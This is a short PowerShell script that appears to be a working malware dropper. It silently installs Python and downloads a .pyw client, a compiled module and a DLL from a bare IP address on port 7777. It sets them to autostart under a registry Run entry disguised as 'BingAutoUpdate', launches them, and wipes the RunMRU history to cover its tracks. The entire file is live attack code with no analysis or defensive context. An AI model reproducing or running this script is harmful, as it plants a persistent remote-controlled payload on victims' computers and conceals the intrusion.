# --- Set up environment 
$dir = "$env:localappdata\.mediaplayer"
$python = "installation.exe"
$version = "3.12.2"

if (-not (Test-Path -Path $dir)) {
  New-Item -Path $dir -ItemType Directory
}

# --- Download and install python 3.12.2  
iwr "https://www.python.org/ftp/python/$version/python-$version-amd64.exe" -OutFile "$env:localappdata\$python"
Start-Process -Wait -FilePath "$env:localappdata\$python" -ArgumentList "/quiet InstallAllUsers=0 InstallLauncherAllUsers=0 PrependPath=1 Include_test=0 Include_pip=0 Include_tcltk=0"

Remove-Item -Path "$env:localappdata\$python"


# --- Download required files
$url = "http://70.34.254.149:7777"
if (-not (Test-Path -Path $dir)) {
  New-Item -Path $dir -ItemType Directory
}

iwr "$url/api/static/client.pyw" -OutFile "$dir\client.pyw"
iwr "$url/api/static/module.pyd" -OutFile "$dir\mediaplayer.cp312-win_amd64.pyd"
iwr "$url/api/static/client.dll" -OutFile "$dir\core.dll"


# --- Add file to autostart and start a python process
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BingAutoUpdate" -Value "$env:localappdata\Programs\Python\Launcher\pyw.exe -3.12 $dir\client.pyw" -Type String
Start-Process -FilePath "$env:localappdata\Programs\Python\Launcher\pyw.exe" -WorkingDirectory $env:localappdata -ArgumentList "-3.12 $dir\client.pyw"


# --- Clean up
$MRU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"

if (Test-Path -Path $MRU) {
  Remove-Item -Path $MRU -Recurse
}
